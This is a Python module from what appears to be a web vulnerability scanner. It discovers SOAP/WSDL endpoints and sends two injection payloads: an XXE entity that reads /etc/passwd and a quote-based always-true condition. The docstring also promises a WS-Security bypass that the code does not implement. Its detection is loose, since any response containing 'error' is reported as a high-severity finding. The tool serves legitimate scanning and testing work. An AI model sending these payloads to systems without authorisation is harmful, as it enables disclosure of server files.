#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - SOAP/WSDL Module
SOAP endpoint detection, WSDL parsing, XML injection, WS-Security bypass.
"""
import re
from config import Colors
from modules.base import BaseModule


class SOAPModule(BaseModule):
    """SOAP/WSDL testing module."""

    name = "SOAP/WSDL"
    vuln_type = "soap"

    WSDL_PATHS = [
        "?wsdl", "?WSDL", "/wsdl", "/Service?wsdl", "/service.asmx?WSDL",
        "/service.svc?wsdl", "/services?wsdl", "/api?wsdl", "/soap?wsdl",
        "/ws?wsdl", "/Service1.asmx?wsdl", "/Service.asmx?wsdl",
    ]

    def test_url(self, url):
        self._test_wsdl_discovery(url)
        self._test_soap_xml_injection(url)

    def test(self, url, method, param, value):
        pass

    def _test_wsdl_discovery(self, url):
        """Discover WSDL endpoints."""
        from urllib.parse import urlparse, urljoin
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path in self.WSDL_PATHS:
            try:
                wsdl_url = base + path
                resp = self.requester.request(wsdl_url, "GET", timeout=5)
                if resp and resp.status_code == 200 and ("definitions" in resp.text.lower() or "wsdl:definitions" in resp.text.lower()):
                    # Extract operations from WSDL
                    operations = re.findall(r'<(?:wsdl:)?operation\s+name="([^"]+)"', resp.text)
                    self.engine.add_finding(self._finding(
                        technique="WSDL Endpoint Disclosure",
                        url=wsdl_url,
                        severity="MEDIUM",
                        confidence=0.95,
                        param="WSDL",
                        payload=wsdl_url,
                        evidence=f"WSDL found with {len(operations)} operations: {', '.join(operations[:10])}",
                    ))
            except Exception:
                pass

    def _test_soap_xml_injection(self, url):
        """Test for XML injection in SOAP endpoints."""
        soap_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>',
            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>" or "1"="1</test></soap:Body></soap:Envelope>',
        ]
        for payload in soap_payloads:
            try:
                headers = {"Content-Type": "text/xml"}
                resp = self.requester.request(url, "POST", data=payload, headers=headers)
                if resp and ("root:" in resp.text or "error" in resp.text.lower()):
                    self.engine.add_finding(self._finding(
                        technique="SOAP XML Injection",
                        url=url,
                        severity="HIGH",
                        confidence=0.6,
                        param="SOAP Body",
                        payload=payload[:100],
                        evidence=f"SOAP response: {resp.text[:200]}",
                    ))
            except Exception:
                pass

    def _finding(self, **kw):
        from core.engine import Finding
        return Finding(**kw)
